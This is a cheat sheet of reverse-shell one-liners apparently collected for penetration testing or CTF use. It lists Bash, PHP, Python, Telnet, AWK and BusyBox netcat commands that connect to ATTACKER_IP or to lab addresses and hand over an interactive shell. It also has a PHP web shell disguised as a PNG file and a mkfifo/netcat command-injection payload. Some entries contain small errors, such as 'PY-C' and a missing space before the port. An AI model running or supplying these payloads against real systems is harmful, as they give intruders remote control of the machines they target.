## Bash

- Normal Bash Reverse Shell: 

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```
- Bash Read Line Reverse Shell
```bash
cat <&5 | while read line; do $line 2>&5 >&5; done
```
- Bash With File Descriptor 196 Reverse shell
```bash
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```
- Bash With File Descriptor 5 Reverse Shell
```bash
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```
## PHP
- Rev Shell from PHP to png

```bash
echo '<?php if(isset($_REQUEST["cmd"])) system($_REQUEST["cmd"]); ?>' > shell.png
```

- PHP Reverse Shell Using the exec Function
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```
- PHP Reverse Shell using the shell-exec Function
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```
- PHP Reverse Shell Using the system Function
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```
- PHP Reverse Shell using the passthru Function
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```
- PHP Reverse Shell Using the popen Function
```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```
## Python

- Python Reverse Shell By Exporting Env Variables:
```bash
export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
- Python Reverse Shell Using the subprocess Module
```bash
PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```
- Short Python Reverse Shell
```bash
PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```
## Telnet

```bash
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
```
## AWK

```bash
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## BusyBox

```bash
busybox nc ATTACKER_IP 443 -e sh
```

# Command Injection

```bash
<?php system('rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <TARGET_IP> <TARGET_PORT> >/tmp/f'); ?>
```

<?php system('rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.164 333 >/tmp/f'); ?>
